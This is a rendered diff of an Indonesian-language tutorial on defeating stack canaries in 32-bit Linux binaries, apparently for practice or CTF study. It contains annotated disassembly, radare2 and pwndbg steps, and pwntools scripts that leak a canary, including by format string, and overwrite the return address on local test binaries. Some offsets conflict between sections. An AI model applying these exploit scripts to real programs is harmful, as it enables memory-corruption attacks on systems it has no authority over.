+</span></span><span style="display:flex;"><span> 80484e1:       65 <span style="color:#ff0">a1</span> <span style="color:#f60">14</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span>       <span style="color:#eedd82">mov</span>    eax,gs:<span style="color:#f60">0x14</span>     <span style="color:#0f0">; Load canary dari TLS</span>
+</span></span><span style="display:flex;"><span> 80484e7:       89 45 <span style="color:#ff0">f4</span>                <span style="color:#eedd82">mov</span>    <span style="color:#ee82ee">DWORD</span> <span style="color:#eedd82">PTR</span> [ebp-<span style="color:#f60">0xc</span>],eax  <span style="color:#0f0">; Simpan canary di stack</span>
+</span></span><span style="display:flex;"><span> 80484ea:       31 <span style="color:#ff0">c0</span>                   <span style="color:#eedd82">xor</span>    eax,eax         <span style="color:#0f0">; Clear eax</span>
+</span></span><span style="display:flex;"><span> 80484ec:       8<span style="color:#ff0">d</span> <span style="color:#f60">45</span> <span style="color:#eedd82">d4</span>                <span style="color:#eedd82">lea</span>    eax,[ebp-<span style="color:#f60">0x2c</span>]  <span style="color:#0f0">; Load address buffer</span>
+</span></span><span style="display:flex;"><span> 80484ef:       89 04 24                <span style="color:#ff0">mov</span>    <span style="color:#ee82ee">DWORD</span> <span style="color:#eedd82">PTR</span> [esp],eax
+</span></span><span style="display:flex;"><span> 80484f2:       <span style="color:#ff0">e8</span> <span style="color:#eedd82">a9</span> <span style="color:#eedd82">fe</span> <span style="color:#eedd82">ff</span> <span style="color:#eedd82">ff</span>          <span style="color:#eedd82">call</span>   <span style="color:#f60">80483</span><span style="color:#eedd82">a0</span> &lt;<span style="color:#eedd82">printf@plt</span>&gt;  <span style="color:#0f0">; Print buffer address</span>
+</span></span><span style="display:flex;"><span> 80484f7:       <span style="color:#ff0">c7</span> <span style="color:#f60">44</span> <span style="color:#f60">24</span> <span style="color:#f60">08</span> <span style="color:#f60">64</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span>    <span style="color:#eedd82">mov</span>    <span style="color:#ee82ee">DWORD</span> <span style="color:#eedd82">PTR</span> [esp+<span style="color:#f60">0x8</span>],<span style="color:#f60">0x64</span>  <span style="color:#0f0">; Argumen read: 100 byte</span>
+</span></span><span style="display:flex;"><span> 80484fe:       00 
+</span></span><span style="display:flex;"><span> 80484ff:       8<span style="color:#ff0">d</span> <span style="color:#f60">45</span> <span style="color:#eedd82">d4</span>                <span style="color:#eedd82">lea</span>    eax,[ebp-<span style="color:#f60">0x2c</span>]  <span style="color:#0f0">; Buffer address</span>
+</span></span><span style="display:flex;"><span> 8048502:       89 44 24 04             <span style="color:#ff0">mov</span>    <span style="color:#ee82ee">DWORD</span> <span style="color:#eedd82">PTR</span> [esp+<span style="color:#f60">0x4</span>],eax
+</span></span><span style="display:flex;"><span> 8048506:       <span style="color:#ff0">c7</span> <span style="color:#f60">04</span> <span style="color:#f60">24</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span> <span style="color:#f60">00</span>    <span style="color:#eedd82">mov</span>    <span style="color:#ee82ee">DWORD</span> <span style="color:#eedd82">PTR</span> [esp],<span style="color:#f60">0x0</span>  <span style="color:#0f0">; stdin</span>
+</span></span><span style="display:flex;"><span> 804850d:       <span style="color:#ff0">e8</span> <span style="color:#f60">8</span><span style="color:#eedd82">e</span> <span style="color:#eedd82">fe</span> <span style="color:#eedd82">ff</span> <span style="color:#eedd82">ff</span>          <span style="color:#eedd82">call</span>   <span style="color:#f60">80483</span><span style="color:#eedd82">a0</span> &lt;<span style="color:#eedd82">read@plt</span>&gt;  <span style="color:#0f0">; Vulnerable read</span>
+</span></span><span style="display:flex;"><span> 8048512:       8<span style="color:#ff0">d</span> <span style="color:#f60">45</span> <span style="color:#eedd82">d4</span>                <span style="color:#eedd82">lea</span>    eax,[ebp-<span style="color:#f60">0x2c</span>]  <span style="color:#0f0">; Buffer address</span>
+</span></span><span style="display:flex;"><span> 8048515:       89 04 24                <span style="color:#ff0">mov</span>    <span style="color:#ee82ee">DWORD</span> <span style="color:#eedd82">PTR</span> [esp],eax
+</span></span><span style="display:flex;"><span> 8048518:       <span style="color:#ff0">e8</span> <span style="color:#f60">73</span> <span style="color:#eedd82">fe</span> <span style="color:#eedd82">ff</span> <span style="color:#eedd82">ff</span>          <span style="color:#eedd82">call</span>   <span style="color:#f60">8048390</span> &lt;<span style="color:#eedd82">printf@plt</span>&gt;  <span style="color:#0f0">; Print buffer content</span>
+</span></span><span style="display:flex;"><span> 804851d:       8<span style="color:#ff0">b</span> <span style="color:#f60">45</span> <span style="color:#eedd82">f4</span>                <span style="color:#eedd82">mov</span>    eax,<span style="color:#ee82ee">DWORD</span> <span style="color:#eedd82">PTR</span> [ebp-<span style="color:#f60">0xc</span>]  <span style="color:#0f0">; Load canary dari stack</span>
+</span></span><span style="display:flex;"><span> 8048520:       65 33 05 14 00 00 00    <span style="color:#ff0">xor</span>    eax,gs:<span style="color:#f60">0x14</span>     <span style="color:#0f0">; Bandingkan dengan canary asli</span>
+</span></span><span style="display:flex;"><span> 8048527:       74 05                   <span style="color:#ff0">je</span>     <span style="color:#f60">804852</span><span style="color:#eedd82">e</span> &lt;<span style="color:#eedd82">vulnerable</span>+<span style="color:#f60">0x53</span>&gt;  <span style="color:#0f0">; Jika sama, lanjut</span>
+</span></span><span style="display:flex;"><span> 8048529:       <span style="color:#ff0">e8</span> <span style="color:#f60">92</span> <span style="color:#eedd82">fe</span> <span style="color:#eedd82">ff</span> <span style="color:#eedd82">ff</span>          <span style="color:#eedd82">call</span>   <span style="color:#f60">80483</span><span style="color:#eedd82">c0</span> &lt;<span style="color:#eedd82">__stack_chk_fail@plt</span>&gt;  <span style="color:#0f0">; Jika beda, abort</span>
+</span></span><span style="display:flex;"><span> 804852e:       <span style="color:#ff0">c9</span>                      <span style="color:#eedd82">leave</span>  
+</span></span><span style="display:flex;"><span> 804852f:       <span style="color:#ff0">c3</span>                      <span style="color:#eedd82">ret</span>    
+</span></span></code></pre></div><h3 id="layout-stack-yang-terperinci">Layout Stack yang Terperinci</h3>
+<p>Dari analisis assembly, kita dapat menentukan layout stack yang tepat:</p>
 <table>
   <thead>
       <tr>
-          <th>Fungsi</th>
-          <th>Deskripsi Risiko</th>
+          <th>Alamat Relatif</th>
+          <th>Ukuran</th>
+          <th>Konten</th>
       </tr>
   </thead>
   <tbody>
       <tr>
-          <td><code>gets</code></td>
-          <td><strong>Paling berbahaya</strong>, tidak batasi input.</td>
+          <td>ebp-0x2c</td>
+          <td>40</td>
+          <td>buffer[40]</td>
       </tr>
       <tr>
-          <td><code>scanf</code></td>
-          <td>Bisa overflow jika format <code>%s</code> tanpa batas.</td>
+          <td>ebp-0x2c+40</td>
+          <td>8</td>
+          <td>Padding (alignment)</td>
       </tr>
       <tr>
-          <td><code>strcpy</code></td>
-          <td>Menyalin string tanpa cek panjang.</td>
+          <td>ebp-0xc</td>
+          <td>4</td>
+          <td>Stack Canary</td>
       </tr>
       <tr>
-          <td><code>fgets</code></td>
-          <td><strong>Lebih aman</strong>, tapi bisa tetap overflow jika ukuran buffer salah.</td>
+          <td>ebp-0x8</td>
+          <td>4</td>
+          <td>Saved EBP</td>
       </tr>
       <tr>
-          <td><code>read</code></td>
-          <td>Bisa overflow jika <code>read(fd, buf, size)</code> dengan <code>size</code> terlalu besar.</td>
+          <td>ebp-0x4</td>
+          <td>4</td>
+          <td>Return Address</td>
       </tr>
   </tbody>
 </table>
-<h3 id="contoh-fungsi-vulnerable"><strong>Contoh Fungsi Vulnerable</strong></h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#0f0">// Contoh 1: gets() (paling mudah di-exploit)
-</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span><span style="color:#ee82ee">void</span> <span style="color:#ff0">vuln</span>() {
-</span></span><span style="display:flex;"><span>  <span style="color:#ee82ee">char</span> buf[<span style="color:#f60">80</span>];
-</span></span><span style="display:flex;"><span>  <span style="color:#ff0">gets</span>(buf);  <span style="color:#0f0">// Bisa overflow!
-</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#0f0">// Contoh 2: fgets() dengan ukuran salah
-</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span><span style="color:#ee82ee">void</span> <span style="color:#ff0">vuln2</span>() {
-</span></span><span style="display:flex;"><span>  <span style="color:#ee82ee">char</span> buf[<span style="color:#f60">80</span>];
-</span></span><span style="display:flex;"><span>  <span style="color:#ff0">fgets</span>(buf, <span style="color:#f60">200</span>, stdin);  <span style="color:#0f0">// Overflow karena size &gt; kapasitas buf
-</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>}
-</span></span></code></pre></div><hr>
-<h2 id="menemukan-posisi-canary-di-stack">Menemukan Posisi Canary di Stack</h2>
-<p>selain menggunakan metode brute force, kita bisa menemukan canary
-didalam stack, Kita akan menggunakan <strong>radare2</strong> untuk menganalisis binary.</p>
-<h3 id="buka-binary-di-r2"><strong>Buka Binary di r2</strong></h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>r2 -d ./binary32   <span style="color:#0f0"># Debug binary 32-bit</span>
-</span></span><span style="display:flex;"><span>aaa                <span style="color:#0f0"># Analisis semua simbol</span>
-</span></span><span style="display:flex;"><span>afl                <span style="color:#0f0"># Lihat daftar fungsi</span>
-</span></span><span style="display:flex;"><span>s sym.vuln         <span style="color:#0f0"># masuk ke vuln() example</span>
-</span></span></code></pre></div><p>Canary biasanya:</p>
+<p><strong>Perhitungan yang Penting:</strong></p>
 <ul>
-<li>Di-load dari <code>gs:0x14</code> (32-bit) atau <code>fs:0x28</code> (64-bit).</li>
-<li>Disimpan di stack (biasanya <code>[ebp - 0xc]</code> atau <code>[rbp - 0x8]</code>).</li>
+<li>Buffer dimulai di <code>ebp-0x2c</code> (44 byte dari ebp)</li>
+<li>Canary berada di <code>ebp-0xc</code> (12 byte dari ebp)</li>
+<li>Jarak dari buffer ke canary: 44 - 12 = 32 byte</li>
+<li>Setelah canary, ada 8 byte (saved ebp) sebelum return address</li>
 </ul>
-<h4 id="contoh-instruksi-canary-di-32-bit"><strong>Contoh Instruksi Canary di 32-bit</strong>:</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#ff0">mov</span> <span style="color:#7fffd4">eax</span>, <span style="color:#7fffd4">gs</span>:<span style="color:#f60">0x14</span>      <span style="color:#0f0">; Load Canary dari GS segment
-</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span><span style="color:#ff0">mov</span> [<span style="color:#7fffd4">ebp</span> - <span style="color:#f60">0xc</span>], <span style="color:#7fffd4">eax</span>  <span style="color:#0f0">; Simpan Canary di stack
-</span></span></span></code></pre></div><h4 id="contoh-instruksi-canary-di-64-bit"><strong>Contoh Instruksi Canary di 64-bit</strong>:</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#ff0">mov</span> <span style="color:#7fffd4">rax</span>, <span style="color:#7fffd4">qword</span> [<span style="color:#7fffd4">fs</span>:<span style="color:#f60">0x28</span>]  <span style="color:#0f0">; Load Canary dari FS segment
-</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span><span style="color:#ff0">mov</span> [<span style="color:#7fffd4">rbp</span> - <span style="color:#f60">0x8</span>], <span style="color:#7fffd4">rax</span>      <span style="color:#0f0">; Simpan Canary di stack
-</span></span></span></code></pre></div><h4 id="1-disassembly-fungsi-vulnerable-di-r2"><strong>1. Disassembly Fungsi Vulnerable di r2</strong></h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#0f0">; Contoh fungsi vuln() di binary
-</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>sym.vuln:
-</span></span><span style="display:flex;"><span>  <span style="color:#ff0">push</span> <span style="color:#7fffd4">ebp</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#ff0">mov</span> <span style="color:#7fffd4">ebp</span>, <span style="color:#7fffd4">esp</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#ff0">sub</span> <span style="color:#7fffd4">esp</span>, <span style="color:#f60">0x54</span>       <span style="color:#0f0">; Alokasi 84 byte buffer
-</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>  <span style="color:#ff0">mov</span> <span style="color:#7fffd4">eax</span>, <span style="color:#7fffd4">gs</span>:<span style="color:#f60">0x14</span>    <span style="color:#0f0">; Load canary
-</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>  <span style="color:#ff0">mov</span> [<span style="color:#7fffd4">ebp-0xc</span>], <span style="color:#7fffd4">eax</span>  <span style="color:#0f0">; Simpan canary di [ebp-0xc]
-</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>  <span style="color:#ff0">lea</span> <span style="color:#7fffd4">eax</span>, [<span style="color:#7fffd4">ebp-0x50</span>] <span style="color:#0f0">; Buffer dimulai di [ebp-0x50]
-</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>  <span style="color:#ff0">push</span> <span style="color:#7fffd4">eax</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#ff0">call</span> <span style="color:#7fffd4">gets</span>           <span style="color:#0f0">; Overflow di sini
-</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>  <span style="color:#0f0">; ...
-</span></span></span></code></pre></div><h4 id="2-penjelasan-layout-stack"><strong>2. Penjelasan Layout Stack</strong></h4>
-<pre tabindex="0"><code>| Alamat Stack | Isi                  |
-|--------------|----------------------|
-| ebp-0x54     | ? (padding)          |
-| ebp-0x50     | BUFFER (mulai sini)  |  &lt;-- Buffer overflow dimulai
-| ...          | ...                  |
-| ebp-0xc      | CANARY               |  &lt;-- Target kita
-| ebp-0x8      | Saved EBP            |
-| ebp-0x4      | Return Address (EIP) |  &lt;-- Goal akhir
-</code></pre><h4 id="3-hitung-offset-ke-canary"><strong>3. Hitung Offset ke Canary</strong></h4>
-<ul>
-<li><strong>Buffer mulai</strong> di <code>[ebp-0x50]</code> (80 byte dari <code>ebp</code>).</li>
-<li><strong>Canary</strong> di <code>[ebp-0xc]</code> (12 byte dari <code>ebp</code>).</li>
-<li><strong>Jarak buffer ke canary</strong> = <code>0x50 - 0xc = 0x44</code> (<strong>68 byte</strong>).</li>
-</ul>
-<hr>
-<h3 id="praktek-di-radare2-r2"><strong>Praktek di radare2 (r2)</strong></h3>
-<h4 id="1-buka-binary-dan-analisis"><strong>1. Buka Binary dan Analisis</strong></h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>r2 -d ./binary32
-</span></span><span style="display:flex;"><span>aaa
-</span></span><span style="display:flex;"><span>s sym.vuln
-</span></span><span style="display:flex;"><span>pdf
-</span></span></code></pre></div><h4 id="2-output-contoh-di-r2"><strong>2. Output Contoh di r2</strong></h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>┌ 150: <span style="color:#ff0">sym.vuln</span> ()<span style="color:#0f0">;
-</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>│           <span style="color:#0f0">; var int32_t var_50h @ ebp-0x50
-</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>│           <span style="color:#0f0">; var int32_t var_ch @ ebp-0xc
-</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>│           0<span style="color:#ff0">x0804852d</span>      <span style="color:#7fffd4">push</span> <span style="color:#7fffd4">ebp</span>
-</span></span><span style="display:flex;"><span>│           0<span style="color:#ff0">x0804852e</span>      <span style="color:#7fffd4">mov</span> <span style="color:#7fffd4">ebp</span>, <span style="color:#7fffd4">esp</span>
-</span></span><span style="display:flex;"><span>│           0<span style="color:#ff0">x08048530</span>      <span style="color:#7fffd4">sub</span> <span style="color:#7fffd4">esp</span>, <span style="color:#f60">0x54</span>
-</span></span><span style="display:flex;"><span>│           0<span style="color:#ff0">x08048533</span>      <span style="color:#7fffd4">mov</span> <span style="color:#7fffd4">eax</span>, <span style="color:#7fffd4">gs</span>:<span style="color:#f60">0x14</span>
-</span></span><span style="display:flex;"><span>│           0<span style="color:#ff0">x08048539</span>      <span style="color:#7fffd4">mov</span> <span style="color:#7fffd4">dword</span> [<span style="color:#7fffd4">var_ch</span>], <span style="color:#7fffd4">eax</span>   <span style="color:#0f0">; [ebp-0xc] = canary
-</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>│           0<span style="color:#ff0">x0804853c</span>      <span style="color:#7fffd4">lea</span> <span style="color:#7fffd4">eax</span>, [<span style="color:#7fffd4">var_50h</span>]       <span style="color:#0f0">; [ebp-0x50] = buffer
-</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>│           0<span style="color:#ff0">x0804853f</span>      <span style="color:#7fffd4">push</span> <span style="color:#7fffd4">eax</span>
-</span></span><span style="display:flex;"><span>│           0<span style="color:#ff0">x08048540</span>      <span style="color:#7fffd4">call</span> <span style="color:#7fffd4">sym.imp.gets</span>        <span style="color:#0f0">; Overflow here
-</span></span></span></code></pre></div><h4 id="3-verifikasi-dengan-breakpoint"><strong>3. Verifikasi dengan Breakpoint</strong></h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>db sym.vuln     <span style="color:#0f0"># Set breakpoint</span>
-</span></span><span style="display:flex;"><span>dc              <span style="color:#0f0"># Run program</span>
-</span></span><span style="display:flex;"><span>px @ ebp-0x50   <span style="color:#0f0"># Lihat buffer</span>
-</span></span><span style="display:flex;"><span>px @ ebp-0xc    <span style="color:#0f0"># Lihat canary</span>
-</span></span></code></pre></div><p>Output:</p>
-<pre tabindex="0"><code>[0xffffd110]  00 00 00 00  00 00 00 00  # Buffer (ebp-0x50)
-[0xffffd15c]  ef be ad de  00 00 00 00  # Canary (ebp-0xc) = 0xdeadbeef
-</code></pre><hr>
-<h3 id="eksploitasi-dengan-python"><strong>Eksploitasi dengan Python</strong></h3>
+<h2 id="praktek-eksploitasi-langkah-demi-langkah">Praktek Eksploitasi Langkah demi Langkah</h2>
+<h3 id="eksploitasi-dengan-format-string-leak">Eksploitasi dengan Format String Leak</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p = process(<span style="color:#87ceeb">&#34;./binary32&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Setup context untuk architecture dan OS</span>
+</span></span><span style="display:flex;"><span>context(arch=<span style="color:#87ceeb">&#39;i386&#39;</span>, os=<span style="color:#87ceeb">&#39;linux&#39;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#0f0"># Langkah 1: Leak Canary</span>
-</span></span><span style="display:flex;"><span>payload = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;A&#34;</span> * <span style="color:#f60">68</span>            <span style="color:#0f0"># Isi buffer sampai canary (0x44 = 68)</span>
-</span></span><span style="display:flex;"><span>p.sendline(payload + <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;BBBB&#34;</span>)  <span style="color:#0f0"># Timpa canary</span>
-</span></span><span style="display:flex;"><span>p.recvuntil(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;BBBB&#34;</span>)
-</span></span><span style="display:flex;"><span>canary = u32(p.recv(<span style="color:#f60">4</span>))        <span style="color:#0f0"># Baca nilai canary</span>
-</span></span><span style="display:flex;"><span>print(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Canary: </span><span style="color:#87ceeb">{</span>hex(canary)<span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Jalankan program vulnerable</span>
+</span></span><span style="display:flex;"><span>p = process(<span style="color:#87ceeb">&#39;./vuln&#39;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#0f0"># Langkah 2: Timpa EIP</span>
-</span></span><span style="display:flex;"><span>payload = (
-</span></span><span style="display:flex;"><span>    <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;A&#34;</span> * <span style="color:#f60">68</span> +                <span style="color:#0f0"># Jarak buffer ke canary</span>
-</span></span><span style="display:flex;"><span>    p32(canary) +              <span style="color:#0f0"># Isi canary asli</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;B&#34;</span> * <span style="color:#f60">8</span> +                 <span style="color:#0f0"># Jarak canary ke EIP (ebp-0xc ke ebp+0x4 = 16 byte)</span>
-</span></span><span style="display:flex;"><span>    p32(<span style="color:#f60">0xdeadbeef</span>)            <span style="color:#0f0"># Return address</span>
-</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Langkah 1: Dapatkan alamat buffer dari output</span>
+</span></span><span style="display:flex;"><span>p.recvuntil(<span style="color:#87ceeb">&#39;at &#39;</span>)
+</span></span><span style="display:flex;"><span>buffer_addr = int(p.recvline().strip(), <span style="color:#f60">16</span>)
+</span></span><span style="display:flex;"><span>log.info(<span style="color:#87ceeb">&#34;Buffer address: 0x</span><span style="color:#87ceeb">%x</span><span style="color:#87ceeb">&#34;</span> % buffer_addr)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Langkah 2: Gunakan format string untuk leak canary</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Dalam arsitektur 32-bit, parameter format string biasanya mulai dari [esp+4]</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Kita perlu menemukan offset yang tepat untuk canary</span>
+</span></span><span style="display:flex;"><span>p.sendline(<span style="color:#87ceeb">&#39;%7$p&#39;</span>)  <span style="color:#0f0"># Coba offset 7 (mungkin perlu disesuaikan)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Langkah 3: Parse output untuk mendapatkan canary</span>
+</span></span><span style="display:flex;"><span>output = p.recvuntil(<span style="color:#87ceeb">&#39;Hello,&#39;</span>)
+</span></span><span style="display:flex;"><span>canary_str = output.split(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;Hello,&#39;</span>)[<span style="color:#f60">0</span>].strip()
+</span></span><span style="display:flex;"><span><span style="color:#f00">try</span>:
+</span></span><span style="display:flex;"><span>    canary = int(canary_str, <span style="color:#f60">16</span>)
+</span></span><span style="display:flex;"><span>    log.info(<span style="color:#87ceeb">&#34;Leaked canary: 0x</span><span style="color:#87ceeb">%x</span><span style="color:#87ceeb">&#34;</span> % canary)
+</span></span><span style="display:flex;"><span><span style="color:#f00">except</span>:
+</span></span><span style="display:flex;"><span>    log.error(<span style="color:#87ceeb">&#34;Failed to leak canary. Try different offset.&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#0f0"># Coba offset lain secara brute force</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">for</span> i in range(<span style="color:#f60">1</span>, <span style="color:#f60">20</span>):
+</span></span><span style="display:flex;"><span>        p = process(<span style="color:#87ceeb">&#39;./vuln&#39;</span>)
+</span></span><span style="display:flex;"><span>        p.recvuntil(<span style="color:#87ceeb">&#39;at &#39;</span>)
+</span></span><span style="display:flex;"><span>        p.sendline(<span style="color:#87ceeb">&#39;%&#39;</span> + str(i) + <span style="color:#87ceeb">&#39;$p&#39;</span>)
+</span></span><span style="display:flex;"><span>        output = p.recvuntil(<span style="color:#87ceeb">&#39;Hello,&#39;</span>)
+</span></span><span style="display:flex;"><span>        val = output.split(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;Hello,&#39;</span>)[<span style="color:#f60">0</span>].strip()
+</span></span><span style="display:flex;"><span>        log.info(<span style="color:#87ceeb">&#34;Offset </span><span style="color:#87ceeb">%d</span><span style="color:#87ceeb">: </span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">&#34;</span> % (i, val))
+</span></span><span style="display:flex;"><span>        p.close()
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#f60">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Langkah 4: Siapkan payload dengan canary yang valid</span>
+</span></span><span style="display:flex;"><span>offset = <span style="color:#f60">32</span>  <span style="color:#0f0"># Jarak dari buffer ke canary</span>
+</span></span><span style="display:flex;"><span>payload = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;A&#39;</span> * offset      <span style="color:#0f0"># Mengisi sampai tepat sebelum canary</span>
+</span></span><span style="display:flex;"><span>payload += p32(canary)       <span style="color:#0f0"># Canary yang valid (tidak diubah)</span>
+</span></span><span style="display:flex;"><span>payload += <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;B&#39;</span> * <span style="color:#f60">8</span>          <span style="color:#0f0"># Mengisi saved EBP dan padding</span>
+</span></span><span style="display:flex;"><span>payload += p32(<span style="color:#f60">0xdeadbeef</span>)   <span style="color:#0f0"># Return address yang ingin kita overwrite</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Langkah 5: Kirim payload</span>
 </span></span><span style="display:flex;"><span>p.sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Langkah 6: Interact dengan shell jika berhasil</span>
 </span></span><span style="display:flex;"><span>p.interactive()
-</span></span></code></pre></div><hr>
-<h3 id="faq-singkat"><strong>FAQ Singkat</strong></h3>
+</span></span></code></pre></div><h3 id="penjelasan-detail-eksploitasi">Penjelasan Detail Eksploitasi</h3>
 <ol>
 <li>
-<p><strong>Q: Kenapa <code>0x50 - 0xc = 0x44</code>?</strong><br>
-<strong>A</strong>: Karena buffer mulai di <code>ebp-0x50</code>, canary di <code>ebp-0xc</code>.<br>
-Jarak = <code>0x50 - 0xc = 0x44</code> (68 byte).</p>
-</li>
-<li>
-<p><strong>Q: Gimana kalau <code>sub esp, 0x60</code>?</strong><br>
-<strong>A</strong>: Hitung lagi buffer ke canary. Misal:</p>
+<p><strong>Leak Canary dengan Format String</strong>:</p>
 <ul>
-<li>Buffer di <code>[ebp-0x60]</code>, canary di <code>[ebp-0xc]</code> → offset = <code>0x60 - 0xc = 0x54</code> (84 byte).</li>
+<li>Format string <code>%7$p</code> akan membaca nilai ke-7 dari stack</li>
+<li>Nilai ini kemungkinan adalah canary karena posisinya di stack</li>
+<li>Canary biasanya dikenali karena diawali null byte (0x00)</li>
 </ul>
 </li>
 <li>
-<p><strong>Q: Nilai <code>[ebp-0xc]</code> selalu tetap?</strong><br>
-<strong>A</strong>: Tidak selalu, tapi umumnya di <code>ebp-0xc</code> (32-bit) atau <code>rbp-0x8</code> (64-bit).<br>
-<strong>Selalu cek di r2</strong> dengan <code>px @ ebp-0xc</code>.</p>
+<p><strong>Crafting Payload</strong>:</p>
+<ul>
+<li>32 byte pertama: Mengisi buffer tanpa mengubah canary</li>
+<li>4 byte berikutnya: Canary asli yang telah kita leak</li>
+<li>8 byte berikutnya: Mengisi saved EBP (bisa apa saja)</li>
+<li>4 byte terakhir: Return address yang kita kontrol</li>
+</ul>
+</li>
+<li>
+<p><strong>Mengatasi Randomization</strong>:</p>
+<ul>
+<li>Canary berbeda setiap eksekusi, jadi harus di-leak setiap kali</li>
+<li>Jika offset format string tidak tepat, perlu brute force</li>
+</ul>
 </li>
 </ol>
-<hr>
-<h3 id="kesimpulan"><strong>Kesimpulan</strong></h3>
+<h2 id="debugging-mendalam-dengan-pwndbg">Debugging Mendalam dengan Pwndbg</h2>
+<h3 id="memahami-proses-debugging">Memahami Proses Debugging</h3>
+<p>Debugging adalah kunci untuk memahami dan mengeksploitasi vulnerability. Berikut langkah-langkah detail dengan Pwndbg:</p>
+<h4 id="1-menjalankan-program-dengan-input-test">1. Menjalankan Program dengan Input Test</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#0f0"># Crash program tanpa canary yang valid</span>
+</span></span><span style="display:flex;"><span>pwndbg&gt; r &lt;&lt;&lt; <span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#34;print &#39;A&#39;*44 + &#39;B&#39;*4 + &#39;C&#39;*8 + &#39;D&#39;*4&#34;</span><span style="color:#f00">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Program akan crash di __stack_chk_fail</span>
